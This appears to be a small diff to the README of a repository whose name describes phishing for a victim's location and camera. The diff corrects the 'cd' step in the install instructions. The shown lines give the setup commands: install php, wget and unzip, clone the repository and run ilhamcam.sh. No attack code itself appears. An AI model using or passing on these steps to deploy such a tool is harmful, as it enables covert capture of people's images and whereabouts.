@@ -35,7 +35,7 @@ apt-get -y install php wget unzip
 
 ```
 git clone https://github.com/ilham9463975-hub/phising-untuk-lokasi-dan-kamera
-cd ilhamcam
+cd phising-untuk-lokasi-dan-kamera
 bash ilhamcam.sh 
 ```
 
